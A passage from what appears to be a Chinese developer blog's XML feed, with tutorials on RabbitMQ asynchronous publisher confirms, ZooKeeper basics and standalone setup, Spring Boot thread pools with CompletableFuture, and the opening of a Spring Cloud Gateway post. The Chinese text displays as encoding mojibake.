href="#handling-publisher-confirms-asynchronously-ÂºÇÊ≠•Âú∞Â§ÑÁêÜÊ∂àÊÅØÁ°ÆËÆ§" class="headerlink" title="handling publisher confirms asynchronously ÂºÇÊ≠•Âú∞Â§ÑÁêÜÊ∂àÊÅØÁ°ÆËÆ§"></a>handling publisher confirms asynchronously ÂºÇÊ≠•Âú∞Â§ÑÁêÜÊ∂àÊÅØÁ°ÆËÆ§</h4><pre><code>private final static String QUEUE_NAME = &quot;test_queue_confirm4&quot;;public static void main(String[] args) throws IOException, TimeoutException {    Connection connection = ConnectionUtils.getConnection();    Channel channel = connection.createChannel();    channel.queueDeclare(QUEUE_NAME,false,false,false,null);    channel.confirmSelect();    channel.addConfirmListener(new ConfirmListener() {        @Override        public void handleAck(long deliveryTag, boolean multiple) throws IOException {            System.out.println(&quot;handleAck deliveryTag &quot;+deliveryTag+&quot; multiple&quot;+multiple);        }        @Override        public void handleNack(long deliveryTag, boolean multiple) throws IOException {            System.out.println(&quot;handleNack deliveryTag &quot;+deliveryTag+&quot; multiple&quot;+multiple);        }    });    long nextSeqNo = channel.getNextPublishSeqNo();    channel.basicPublish(&quot;&quot;,QUEUE_NAME,null,&quot;send listener message&quot;.getBytes());    System.out.println(&quot;[send] message&quot; +&quot;send listener message&quot; + &quot;nextSeqNo &quot;+ nextSeqNo );}</code></pre><h4 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h4><p>rabbitMqÁöÑackÂíåpublisher confirmÈúÄË¶ÅÂå∫ÂàÜÂºÄÊù•„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zookeeper-ÁÆÄ‰ªã</title>
      <link href="/2020/04/24/zookeeper-%E7%AE%80%E4%BB%8B/"/>
      <url>/2020/04/24/zookeeper-%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h4 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h4><pre><code>ZooKeeper: A Distributed Coordination Service for Distributed ApplicationszooKeeper:‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèÂ∫îÁî®ÁöÑÂàÜÂ∏ÉÂºèÂçèË∞ÉÊúçÂä°ZooKeeper is a distributed, open-source coordination service for distributed applications. It exposes a simple set of primitives that distributed applications can build upon to implement higher level services for synchronization, configuration maintenance, and groups and naming. It is designed to be easy to program to, and uses a data model styled after the familiar directory tree structure of file systems. It runs in Java and has bindings for both Java and C.zooKeeperÊòØ‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèÂ∫îÁî®ÁöÑÂàÜÂ∏ÉÂºèÔºåÂºÄÊ∫êÔºåÂçèË∞ÉÊúçÂä°„ÄÇÂÆÉÊèê‰æõ‰∫Ü‰∏ÄÁªÑÁÆÄÂçïÁöÑÂéüËØ≠ÔºåÂàÜÂ∏ÉÂºèÂ∫îÁî®ÂèØ‰ª•Âú®Ëøô‰∫õÂéüËØ≠Âü∫Á°Ä‰∏äÂÆûÁé∞Êõ¥È´òÁ∫ßÁöÑÊúçÂä°ÔºåÁî®‰∫éÂêåÊ≠•ÔºåÈÖçÁΩÆÁª¥Êä§ÔºåÁªÑÂêàÂëΩÂêç„ÄÇÂÆÉË¢´ËÆæËÆ°Êòì‰∫é‰ΩøÁî®ÔºåÂπ∂‰ΩøÁî®‰∫ÜÈ£éÊ†ºÂíåÊñá‰ª∂Á≥ªÁªüÁõ∏‰ººÁöÑÊï∞ÊçÆÊ®°Âûã„ÄÇÂÆÉÂú®javaËøêË°åÔºåÂπ∂ÂÖ∑ÊúâjavaÂíåcÁªëÂÆö„ÄÇCoordination services are notoriously hard to get right. They are especially prone to errors such as race conditions and deadlock. The motivation behind ZooKeeper is to relieve distributed applications the responsibility of implementing coordination services from scratch.ÂçèË∞ÉÊúçÂä°ÊòØÂá∫‰∫ÜÂêçÁöÑÈöæÂÜô„ÄÇ‰ªñ‰ª¨ÁâπÂà´ÂÆπÊòìÂá∫Áé∞Á´û‰∫âÊù°‰ª∂ÂíåÊ≠ªÈîÅÈîôËØØ„ÄÇzookeeperËÉåÂêéÁöÑÂä®Êú∫ÊòØ‰∏∫‰∫ÜÂáèÂ∞ëÂàÜÂ∏ÉÂºèÂ∫îÁî®Á®ãÂ∫è‰ªéÂ§¥ÂÆûÁé∞ÂçèË∞ÉÊúçÂä°ÁöÑË¥£‰ªª„ÄÇDesign GoalsZooKeeper is simple. ZooKeeper allows distributed processes to coordinate with each other through a shared hierarchical namespace which is organized similarly to a standard file system. The namespace consists of data registers - called znodes, in ZooKeeper parlance - and these are similar to files and directories. Unlike a typical file system, which is designed for storage, ZooKeeper data is kept in-memory, which means ZooKeeper can achieve high throughput and low latency numbers.zooKeeperÊòØÁÆÄÂçïÁöÑ„ÄÇzooKeeperÂÖÅËÆ∏ÂàÜÂ∏ÉÂºèËøõÁ®ãÈÄöËøáÂÖ±‰∫´ÁöÑÂ±ÇÊ¨°ÂëΩÂêçÁ©∫Èó¥Áõ∏‰∫íÂçèË∞ÉÔºåËØ•ÂëΩÂêçÁ©∫Èó¥Á±ª‰ºº‰∫éÊ†áÂáÜÊñá‰ª∂Á≥ªÁªü„ÄÇÂëΩÂêçÁ©∫Èó¥Áî±Êï∞ÊçÆÂØÑÂ≠òÂô®Ê≥®ÂÜåÔºåÁî®zooKeeperÁöÑËØùËØ¥Âè´znodesÔºåÁ±ª‰ºº‰∫éÊñá‰ª∂Á≥ªÁªü‰∏≠ÁöÑÁõÆÂΩïÂíåÊñá‰ª∂„ÄÇ‰∏çÂÉèÂÖ∏ÂûãÁöÑÊñá‰ª∂Á≥ªÁªüÔºåzookeeperÊòØËÆæËÆ°Áî®‰∫é‰øùÂ≠òÂú®ÂÜÖÂ≠ò‰∏≠ÔºåÊÑèÂë≥ÁùÄzooKeeperÂèØ‰ª•ÂÆûÁé∞È´òÂêûÂêêÈáèÂíå‰ΩéÂª∂ËøüÁéá„ÄÇThe ZooKeeper implementation puts a premium on high performance, highly available, strictly ordered access. The performance aspects of ZooKeeper means it can be used in large, distributed systems. The reliability aspects keep it from being a single point of failure. The strict ordering means that sophisticated synchronization primitives can be implemented at the client.ZooKeeperÂÆûÊñΩÂØπÈ´òÊÄßËÉΩÔºåÈ´òÂèØÁî®ÊÄßÔºå‰∏•Ê†ºÊúâÂ∫èËÆøÈóÆÂä†‰ª•ÈáçËßÜ„ÄÇ ZooKeeperÁöÑÊÄßËÉΩÊñπÈù¢ÊÑèÂë≥ÁùÄÂÆÉÂèØ‰ª•Âú®Â§ßÂûãÁöÑÂàÜÂ∏ÉÂºèÁ≥ªÁªü‰∏≠‰ΩøÁî®„ÄÇ ÂèØÈù†ÊÄßÊñπÈù¢‰ΩøÂÆÉ‰∏ç‰ºöÊàê‰∏∫ÂçïÁÇπÊïÖÈöú„ÄÇ ‰∏•Ê†ºÊéíÂ∫èÊÑèÂë≥ÁùÄÂèØ‰ª•Âú®ÂÆ¢Êà∑Á´Ø‰∏äÂÆûÁé∞Â§çÊùÇÁöÑÂêåÊ≠•ÂéüËØ≠„ÄÇZooKeeper is replicated. Like the distributed processes it coordinates, ZooKeeper itself is intended to be replicated over a set of hosts called an ensemble.ZooKeeperÊòØÂ§çÂà∂ÁöÑ„ÄÇ‰∏éÂÆÉÊâÄÂçèË∞ÉÁöÑÂàÜÂ∏ÉÂºèËøõÁ®ã‰∏ÄÊ†∑ÔºåZooKeeperÊú¨Ë∫´‰πüÊâìÁÆóÂú®‰∏ÄÁªÑÁß∞‰∏∫ÈõÜÂêàÁöÑ‰∏ªÊú∫‰∏äËøõË°åÂ§çÂà∂„ÄÇThe servers that make up the ZooKeeper service must all know about each other. They maintain an in-memory image of state, along with a transaction logs and snapshots in a persistent store. As long as a majority of the servers are available, the ZooKeeper service will be available.ÁªÑÊàêZooKeeperÊúçÂä°ÁöÑÊúçÂä°Âô®ÂøÖÈ°ªÁõ∏‰∫í‰∫ÜËß£„ÄÇÂÆÉ‰ª¨Âú®ÂÜÖÂ≠ò‰∏≠Áª¥Êä§Áä∂ÊÄÅÊò†ÂÉèÔºå‰ª•ÂèäÊåÅ‰πÖÂ≠òÂÇ®‰∏≠ÁöÑ‰∫ãÂä°Êó•ÂøóÂíåÂø´ÁÖß„ÄÇÂè™Ë¶ÅÂ§ßÂ§öÊï∞ÊúçÂä°Âô®ÂèØÁî®ÔºåZooKeeperÊúçÂä°Â∞±ÂèØÁî®„ÄÇClients connect to a single ZooKeeper server. The client maintains a TCP connection through which it sends requests, gets responses, gets watch events, and sends heart beats. If the TCP connection to the server breaks, the client will connect to a different server.ÂÆ¢Êà∑Á´ØËøûÊé•Âà∞Âçï‰∏™ZooKeeperÊúçÂä°Âô®„ÄÇÂÆ¢Êà∑Á´ØÁª¥Êä§‰∏Ä‰∏™TCPËøûÊé•ÔºåÈÄöËøáÂÆÉÂèëÈÄÅËØ∑Ê±Ç„ÄÅËé∑ÂèñÂìçÂ∫î„ÄÅËé∑ÂèñÁõëËßÜ‰∫ã‰ª∂ÂíåÂèëÈÄÅÂøÉË∑≥„ÄÇÂ¶ÇÊûúÂà∞ÊúçÂä°Âô®ÁöÑTCPËøûÊé•‰∏≠Êñ≠ÔºåÂÆ¢Êà∑Êú∫Â∞ÜËøûÊé•Âà∞Âè¶‰∏ÄÂè∞ÊúçÂä°Âô®„ÄÇZooKeeper is ordered. ZooKeeper stamps each update with a number that reflects the order of all ZooKeeper transactions. Subsequent operations can use the order to implement higher-level abstractions, such as synchronization primitives.ZookeeperÊòØÊúâÂ∫èÁöÑ„ÄÇZooKeeperÁî®‰∏Ä‰∏™Êï∞Â≠óÊù•Ê†áËÆ∞ÊØè‰∏™Êõ¥Êñ∞ÔºåËøô‰∏™Êï∞Â≠óÂèçÊò†‰∫ÜÊâÄÊúâZooKeeper‰∫ãÂä°ÁöÑÈ°∫Â∫è„ÄÇÂêéÁª≠Êìç‰ΩúÂèØ‰ª•‰ΩøÁî®ËØ•È°∫Â∫èÂÆûÁé∞Êõ¥È´òÁ∫ßÂà´ÁöÑÊäΩË±°ÔºåÊØîÂ¶ÇÂêåÊ≠•ÂéüËØ≠„ÄÇZooKeeper is fast. It is especially fast in &quot;read-dominant&quot; workloads. ZooKeeper applications run on thousands of machines, and it performs best where reads are more common than writes, at ratios of around 10:1.ZooKeeperÂæàÂø´„ÄÇÂú®‚Äú‰ª•ËØªÂèñ‰∏∫‰∏ª‚ÄùÁöÑÂ∑•‰ΩúË¥üËΩΩ‰∏≠ÔºåÂÆÉÁöÑÈÄüÂ∫¶ÁâπÂà´Âø´„ÄÇZooKeeperÂ∫îÁî®Á®ãÂ∫èËøêË°åÂú®Êï∞ÂçÉÂè∞Êú∫Âô®‰∏äÔºåÂΩìËØªÊìç‰ΩúÊØîÂÜôÊìç‰ΩúÊõ¥Â∏∏ËßÅÊó∂ÔºåÂÆÉÁöÑÊÄßËÉΩÊúÄÂ•ΩÔºåÊØîÁéáÁ∫¶‰∏∫10:1„ÄÇData model and the hierarchical namespaceThe namespace provided by ZooKeeper is much like that of a standard file system. A name is a sequence of path elements separated by a slash (/). Every node in ZooKeeper&apos;s namespace is identified by a path.Êï∞ÊçÆÊ®°ÂûãÂíåÂàÜÂ±ÇÂêçÁß∞Á©∫Èó¥ZooKeeperÊèê‰æõÁöÑÂêçÁß∞Á©∫Èó¥‰∏éÊ†áÂáÜÊñá‰ª∂Á≥ªÁªüÁöÑÂêçÁß∞Á©∫Èó¥ÈùûÂ∏∏Áõ∏‰ºº„ÄÇ ÂêçÁß∞ÊòØÁî±ÊñúÊù†Ôºà/ÔºâÂàÜÈöîÁöÑ‰∏ÄÁ≥ªÂàóË∑ØÂæÑÂÖÉÁ¥†„ÄÇ ZooKeeperÂëΩÂêçÁ©∫Èó¥‰∏≠ÁöÑÊØè‰∏™ËäÇÁÇπÈÉΩÁî±Ë∑ØÂæÑÊ†áËØÜ„ÄÇNodes and ephemeral nodesUnlike standard file systems, each node in a ZooKeeper namespace can have data associated with it as well as children. It is like having a file-system that allows a file to also be a directory. (ZooKeeper was designed to store coordination data: status information, configuration, location information, etc., so the data stored at each node is usually small, in the byte to kilobyte range.) We use the term znode to make it clear that we are talking about ZooKeeper data nodes.Znodes maintain a stat structure that includes version numbers for data changes, ACL changes, and timestamps, to allow cache validations and coordinated updates. Each time a znode&apos;s data changes, the version number increases. For instance, whenever a client retrieves data it also receives the version of the data.The data stored at each znode in a namespace is read and written atomically. Reads get all the data bytes associated with a znode and a write replaces all the data. Each node has an Access Control List (ACL) that restricts who can do what.ZooKeeper also has the notion of ephemeral nodes. These znodes exists as long as the session that created the znode is active. When the session ends the znode is deleted.ËäÇÁÇπÂíåÁü≠ÊöÇËäÇÁÇπ‰∏éÊ†áÂáÜÊñá‰ª∂Á≥ªÁªü‰∏çÂêåÔºåZooKeeperÂëΩÂêçÁ©∫Èó¥‰∏≠ÁöÑÊØè‰∏™ËäÇÁÇπÈÉΩÂèØ‰ª•ÂÖ∑Êúâ‰∏éÂÖ∂ÂÖ≥ËÅîÁöÑÊï∞ÊçÆ‰ª•ÂèäÂ≠êËäÇÁÇπ„ÄÇ Â∞±ÂÉèÊã•Êúâ‰∏Ä‰∏™Êñá‰ª∂Á≥ªÁªü‰∏ÄÊ†∑ÔºåËØ•Êñá‰ª∂Á≥ªÁªü‰πüÂÖÅËÆ∏Êñá‰ª∂Êàê‰∏∫ÁõÆÂΩï„ÄÇ ÔºàZooKeeperÊó®Âú®Â≠òÂÇ®ÂçèË∞ÉÊï∞ÊçÆÔºöÁä∂ÊÄÅ‰ø°ÊÅØÔºåÈÖçÁΩÆÔºå‰ΩçÁΩÆ‰ø°ÊÅØÁ≠âÔºåÂõ†Ê≠§Â≠òÂÇ®Âú®ÊØè‰∏™ËäÇÁÇπ‰∏äÁöÑÊï∞ÊçÆÈÄöÂ∏∏ÂæàÂ∞èÔºåÂú®Â≠óËäÇÂà∞ÂçÉÂ≠óËäÇËåÉÂõ¥ÂÜÖ„ÄÇÔºâÊàë‰ª¨‰ΩøÁî®ÊúØËØ≠znodeÊù•ÊòéÁ°ÆË°®Á§∫ Âú®Ë∞àËÆ∫ZooKeeperÊï∞ÊçÆËäÇÁÇπ„ÄÇZnodesÁª¥Êä§‰∏Ä‰∏™ÁªüËÆ°‰ø°ÊÅØÁªìÊûÑÔºåÂÖ∂‰∏≠ÂåÖÊã¨Áî®‰∫éÊï∞ÊçÆÊõ¥ÊîπÔºåACLÊõ¥ÊîπÂíåÊó∂Èó¥Êà≥ÁöÑÁâàÊú¨Âè∑Ôºå‰ª•ÂÖÅËÆ∏ËøõË°åÁºìÂ≠òÈ™åËØÅÂíåÂçèË∞ÉÊõ¥Êñ∞„ÄÇ znodeÁöÑÊï∞ÊçÆÊØèÊ¨°Êõ¥ÊîπÊó∂ÔºåÁâàÊú¨Âè∑ÈÉΩ‰ºöÂ¢ûÂä†„ÄÇ ‰æãÂ¶ÇÔºåÊØèÂΩìÂÆ¢Êà∑Á´ØÊ£ÄÁ¥¢Êï∞ÊçÆÊó∂ÔºåÂÆÉ‰πüÊé•Êî∂Êï∞ÊçÆÁöÑÁâàÊú¨„ÄÇÂéüÂ≠êÂú∞ËØªÂèñÂíåÂÜôÂÖ•Â≠òÂÇ®Âú®ÂêçÁß∞Á©∫Èó¥‰∏≠ÊØè‰∏™znode‰∏äÁöÑÊï∞ÊçÆ„ÄÇ ËØªÂèñÂ∞ÜËé∑Âèñ‰∏éznodeÂÖ≥ËÅîÁöÑÊâÄÊúâÊï∞ÊçÆÂ≠óËäÇÔºåËÄåÂÜôÂÖ•Â∞ÜÊõøÊç¢ÊâÄÊúâÊï∞ÊçÆ„ÄÇ ÊØè‰∏™ËäÇÁÇπÈÉΩÊúâ‰∏Ä‰∏™ËÆøÈóÆÊéßÂà∂ÂàóË°®ÔºàACLÔºâÔºåÁî®‰∫éÈôêÂà∂Ë∞ÅÂèØ‰ª•ÊâßË°åÊìç‰Ωú„ÄÇZooKeeperËøòÂÖ∑ÊúâÁü≠ÊöÇËäÇÁÇπÁöÑÊ¶ÇÂøµ„ÄÇ Âè™Ë¶ÅÂàõÂª∫znodeÁöÑ‰ºöËØùÂ§Ñ‰∫éÊ¥ªÂä®Áä∂ÊÄÅÔºåËøô‰∫õznodeÂ∞±Â≠òÂú®„ÄÇ ‰ºöËØùÁªìÊùüÊó∂ÔºåÂ∞ÜÂà†Èô§znode„ÄÇConditional updates and watchesZooKeeper supports the concept of watches. Clients can set a watch on a znode. A watch will be triggered and removed when the znode changes. When a watch is triggered, the client receives a packet saying that the znode has changed. If the connection between the client and one of the ZooKeeper servers is broken, the client will receive a local notification.Êù°‰ª∂Êõ¥Êñ∞ÂíåÊâãË°®ZooKeeperÊîØÊåÅÊâãË°®ÁöÑÊ¶ÇÂøµ„ÄÇÂÆ¢Êà∑Á´ØÂèØ‰ª•Âú®znode‰∏äËÆæÁΩÆÊâãË°®„ÄÇÂΩìznodeÂèëÁîüÂèòÂåñÊó∂ÔºåÂ∞ÜËß¶ÂèëÂπ∂Âà†Èô§‰∏Ä‰∏™ÊâãË°®„ÄÇÂΩì‰∏Ä‰∏™ÊâãË°®Ë¢´Ëß¶ÂèëÊó∂ÔºåÂÆ¢Êà∑Á´Ø‰ºöÊî∂Âà∞‰∏Ä‰∏™Êï∞ÊçÆÂåÖÔºåËØ¥znodeÂ∑≤ÁªèÊîπÂèò‰∫Ü„ÄÇÂ¶ÇÊûúÂÆ¢Êà∑Á´ØÂíå‰∏Ä‰∏™ZooKeeperÊúçÂä°Âô®‰πãÈó¥ÁöÑËøûÊé•Êñ≠ÂºÄÔºåÂÆ¢Êà∑Á´ØÂ∞ÜÊî∂Âà∞‰∏Ä‰∏™Êú¨Âú∞ÈÄöÁü•„ÄÇ</code></pre><h4 id="ÂÆâË£Özookeeper"><a href="#ÂÆâË£Özookeeper" class="headerlink" title="ÂÆâË£Özookeeper"></a>ÂÆâË£Özookeeper</h4><p>Standalone Operation</p><pre><code>1.‰∏ãËΩΩzookeeperÔºåÈÄöËøáfileZile‰∏ä‰º†‰∏äÂéªtar -zxvf apache-zookeeper-3.6.0-bin.tar.gz2.ÂÆâË£Öjava3.Â∞ÜËß£ÂéãÂêéÁöÑÊñá‰ª∂ÂêçÈáçÂëΩÂêçmv apache-zookeeper-3.6.0-bin zookeeperÂπ∂ÁßªÂä®Ëá≥/usr/libmv /tmp/zookeeper/ /usr/libStandalone OperationÂçïÂáªÊºîÁ§∫4.ÁîüÊàê‰∏Ä‰∏™zoo.cfgvi conf zoo.cfg‚Äã```tickTime=2000dataDir=/var/lib/zookeeperclientPort=2181‚Äã```ÂêØÂä®sh bin/zkServer.sh start5.ÊµãËØïsh bin/zkCli.sh -server 127.0.0.1:2181ls /[ zookeeper]Next, create a new znode by running create /zk_test my_data. This creates a new znode and associates the string &quot;my_data&quot; with the node. You should see:[zkshell: 9] create /zk_test my_dataCreated /zk_test[zk: 127.0.0.1:2181(CONNECTED) 0] ls /[zk_test, zookeeper][zk: 127.0.0.1:2181(CONNECTED) 3] get /zk_testmy_data[zk: 127.0.0.1:2181(CONNECTED) 5] get -s /zk_testmy_datacZxid = 0x3ctime = Wed Apr 22 18:33:23 CST 2020mZxid = 0x3mtime = Wed Apr 22 18:33:23 CST 2020pZxid = 0x3cversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x0dataLength = 7numChildren = 0[zk: 127.0.0.1:2181(CONNECTED) 6] set /zk_test junk[zk: 127.0.0.1:2181(CONNECTED) 7] get -s /zk_testjunkcZxid = 0x3ctime = Wed Apr 22 18:33:23 CST 2020mZxid = 0x7mtime = Fri Apr 24 17:48:13 CST 2020pZxid = 0x3cversion = 0dataVersion = 1aclVersion = 0ephemeralOwner = 0x0dataLength = 4numChildren = 0ÂèØ‰ª•ÁúãÂà∞mTimeË¢´ÊîπÂèò‰∫ÜÔºå‰ª•ÂèäznodeÁöÑÂÄº[zk: 127.0.0.1:2181(CONNECTED) 8] delete /zk_testÂà†Èô§/zk_test[zk: 127.0.0.1:2181(CONNECTED) 9] get -s /zk_testorg.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode = NoNode for /zk_test</code></pre><p>ÈõÜÁæ§Ê®°Âºè ÂêéÁª≠ÂÜç‰ªãÁªç</p>]]></content>
      
      
      
        <tags>
            
            <tag> ZooKeeper </tag>
            
            <tag> zookeeper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springbootÁ∫øÁ®ãÊ±†</title>
      <link href="/2020/04/20/springboot%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2020/04/20/springboot%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="ÈÖçÁΩÆ‰∏Ä‰∏™ExecutorService"><a href="#ÈÖçÁΩÆ‰∏Ä‰∏™ExecutorService" class="headerlink" title="ÈÖçÁΩÆ‰∏Ä‰∏™ExecutorService"></a>ÈÖçÁΩÆ‰∏Ä‰∏™ExecutorService</h4><pre><code>@Configuration@EnableAsyncpublic class BeanConfig {    @Bean    public ExecutorService getAsyncExecutor(){        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();        executor.setCorePoolSize(7);        executor.setMaxPoolSize(42);        executor.setQueueCapacity(11);        executor.setThreadNamePrefix(&quot;async-executor-&quot;);        executor.initialize();        return executor.getThreadPoolExecutor();    }}</code></pre><h4 id="ÁºñÂÜô"><a href="#ÁºñÂÜô" class="headerlink" title="ÁºñÂÜô"></a>ÁºñÂÜô</h4><pre><code>package com.huskyui.currencyspringinaction.controller;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import javax.annotation.Resource;import java.util.concurrent.*;/** * @author huskyui * @date 2020/4/17 15:50 */@RestControllerpublic class HelloController {    private Logger logger = LoggerFactory.getLogger(HelloController.class);    @Resource    private ExecutorService executorService;    @RequestMapping(&quot;/sync&quot;)    public String sync() {        long start = System.currentTimeMillis();        int resultA = 0,                resultB = 0;        try {            TimeUnit.SECONDS.sleep(2);            resultA = 2;        } catch (InterruptedException e) {            e.printStackTrace();        }        try {            TimeUnit.SECONDS.sleep(1);            resultB = 1;        } catch (InterruptedException e) {            e.printStackTrace();        }        long cost = System.currentTimeMillis() - start;        logger.info(&quot;sync cost:{} result {}&quot;, cost, (resultA + resultB));        return String.valueOf(resultA + resultB);    }    @RequestMapping(&quot;/async&quot;)    public String async() throws ExecutionException, InterruptedException {        long start = System.currentTimeMillis();        int result = 0;        // IntegerÊòØfutureAÁöÑËøîÂèÇÁ±ªÂûã        CompletableFuture&lt;Integer&gt; futureA = CompletableFuture.supplyAsync(() -&gt; {            // Ê®°ÊãüÂ∑•‰Ωú1            try {                TimeUnit.SECONDS.sleep(2);            } catch (InterruptedException e) {                e.printStackTrace();            }            return 2;        }, executorService);        CompletableFuture&lt;Integer&gt; futureB = CompletableFuture.supplyAsync(() -&gt; {            // Ê®°ÊãüÂ∑•‰Ωú2            try {                TimeUnit.SECONDS.sleep(1);            } catch (InterruptedException e) {                e.printStackTrace();            }            return 1;        }, executorService);        CompletableFuture&lt;Void&gt; allFuture = CompletableFuture.allOf(futureA, futureB);        allFuture.join();        result = futureA.get() + futureB.get();        long cost = System.currentTimeMillis() - start;        logger.info(&quot;async cost:{} result {}&quot;, cost, result);        return String.valueOf(result);    }}</code></pre><h4 id="ÊµãËØï"><a href="#ÊµãËØï" class="headerlink" title="ÊµãËØï"></a>ÊµãËØï</h4><p>ÂèØ‰ª•ÁúãÂà∞syncËØ∑Ê±ÇÊó∂Ôºå‰ºöËÄóÊó∂3ÁßíÔºåasyncËØ∑Ê±ÇÔºåËÄóÊó∂2Áßí</p><h4 id="ÊÑüË∞¢"><a href="#ÊÑüË∞¢" class="headerlink" title="ÊÑüË∞¢"></a>ÊÑüË∞¢</h4><p>ÈòÖËØª‰∫Ü‰∏Ä‰∫õÂÖ∂‰ªñ‰∫∫ÁöÑÂçöÂÆ¢Ôºå‰ª•ÂèäNetty‰∫§ÊµÅÁæ§ÈáåÈù¢Â§ß‰Ω¨‰º†Êéà</p><h4 id="Á¨¨‰∫åÁßçÂÜôÊ≥ï"><a href="#Á¨¨‰∫åÁßçÂÜôÊ≥ï" class="headerlink" title="Á¨¨‰∫åÁßçÂÜôÊ≥ï"></a>Á¨¨‰∫åÁßçÂÜôÊ≥ï</h4><p>ÂèØ‰ª•Êü•Áúã <a href="https://spring.io/guides/gs/async-method/" target="_blank" rel="noopener"> ÂÆòÊñπÊïôÁ®ã </a></p><p>‰ΩøÁî® <code>@Async</code> Ê≥®Ëß£</p><pre><code>@Servicepublic class GitHubLookupService {    private static final Logger logger = LoggerFactory.getLogger(GitHubLookupService.class);    private final RestTemplate restTemplate;    public GitHubLookupService(RestTemplateBuilder restTemplateBuilder) {        this.restTemplate = restTemplateBuilder.build();    }    @Async    public CompletableFuture&lt;User&gt; findUser(String user) throws InterruptedException{        logger.info(&quot;Looking up &quot;+user);        String url = String.format(&quot;https://api.github.com/users/%s&quot;,user);        User results = restTemplate.getForObject(url,User.class);        // Artificial delay of 1s for demonstration purpose        Thread.sleep(1000L);        return CompletableFuture.completedFuture(results);    }}@Componentpublic class AppRunner implements CommandLineRunner {    private static final Logger logger = LoggerFactory.getLogger(AppRunner.class);    private final GitHubLookupService gitHubLookupService;    public AppRunner(GitHubLookupService githubLookupService) {        this.gitHubLookupService = githubLookupService;    }    @Override    public void run(String... args) throws Exception {        // start the Clock        long start = System.currentTimeMillis();        // Kick of multiple,asynchronous lookups        CompletableFuture&lt;User&gt; page1 = gitHubLookupService.findUser(&quot;PivotalSoftware&quot;);        CompletableFuture&lt;User&gt; page2 = gitHubLookupService.findUser(&quot;CloudFoundry&quot;);        CompletableFuture&lt;User&gt; page3 = gitHubLookupService.findUser(&quot;Spring-Projects&quot;);        CompletableFuture&lt;User&gt; page4 = gitHubLookupService.findUser(&quot;huskyui&quot;);        // wait unit they are all done        CompletableFuture.allOf(page1, page2, page3, page4).join();        logger.info(&quot;Elapsed time: &quot; + (System.currentTimeMillis() - start));        logger.info(&quot;--&gt;&quot; + page1.get());        logger.info(&quot;--&gt;&quot; + page2.get());        logger.info(&quot;--&gt;&quot; + page3.get());        logger.info(&quot;--&gt;&quot; + page4.get());    }}</code></pre><p>ÂΩìÁÑ∂ÂØπ‰∫éÔºå‰ªªÂä°ÁöÑÊï∞Èáè‰∏çÂÆöÁöÑËØùÔºåÂèØ‰ª•‰ΩøÁî®<br>‰∏ãÈù¢ËøôÂº†ÊñπÂºè</p><pre><code>@Overridepublic List&lt;String&gt; doTasks() throws InterruptedException, ExecutionException {    List&lt;String&gt; result = new ArrayList&lt;&gt;();    List&lt;CompletableFuture&lt;String&gt;&gt; completableFutureList = new ArrayList&lt;&gt;();    for (int i = 0; i &lt; 100; i++) {        completableFutureList.add(taskService.doSingleTask(i));    }    CompletableFuture&lt;String&gt;[] completableFutures = completableFutureList.toArray(new CompletableFuture[completableFutureList.size()]);    CompletableFuture.allOf(completableFutures).join();    for(CompletableFuture&lt;String&gt; future:completableFutures){        result.add(future.get());    }    return result;}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
            <tag> springboot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring cloud gateway</title>
      <link href="/2020/04/17/spring%20cloud%20gateway/"/>
      <url>/2020/04/17/spring%20cloud%20gateway/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Âú®ÂÜô‰πãÂâçÔºåÊÉ≥ÂÜô‰∏Ä‰∏ãÊÑüÂèóÔºå‰πãÂâçÊúâÂØπÊé•ËøáspringcloudÁöÑÈ°πÁõÆÔºåÊúâ‰ª•‰∏ãÂá†‰∏™ÊÑüÂèó</p><p>1.Êàë‰ª¨ËØ∑Ê±ÇÊâÄÊúâÊé•Âè£ÔºåÈÉΩÊòØËØ∑Ê±ÇÂêå‰∏Ä‰∏™Á´ØÂè£ÔºåË∑ØÂæÑ‰∏çÂêåÔºåÈÉΩ‰ºöÂä†‰∏Ä‰∏™tokenÊù•È™åËØÅÊùÉÈôê</p><p>ÊàëÊÑüËßâÊòØËøô‰πàÂÆûÁé∞ÁöÑÔºåÊúçÂä°Âô®ÂØπÂ§ñËÆøÈóÆÂè™ÂºÄÊîægatewayÈ°πÁõÆÁ´ØÂè£ÔºåÁÑ∂ÂêéÂä†‰∏Ä‰∏™tokenÊù•ÂÖ®Â±Äfilter</p><p>ÂΩìÁÑ∂ÔºåÊàë‰∏çÊòØËøô‰∏™È°πÁõÆÁöÑËÆæËÆ°Â∏àÔºåËøôÊòØÂá≠Á©∫ÊÉ≥Ë±°ËÄåÂ∑≤„ÄÇ</p></blockquote><h4 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h4><p>This project provides an API Gateway built on top of the Spring Ecosystem,<br>including: Spring 5, Spring Boot 2 and Project Reactor. Spring Cloud Gateway<br>aims to provide a simple, yet effective way to route to APIs and provide cross<br>cutting concerns to them such as: security, monitoring/metrics, and<br>resiliency.</p><p>ËØ•È°πÁõÆÊèê‰æõ‰∫Ü‰∏Ä‰∏™Âú®springÁîüÊÄÅÁ≥ªÁªü‰∏äÊûÑÂª∫ÁöÑapiÁΩëÂÖ≥ÔºåÂåÖÊã¨spring 5,spring boot2Âíåproject 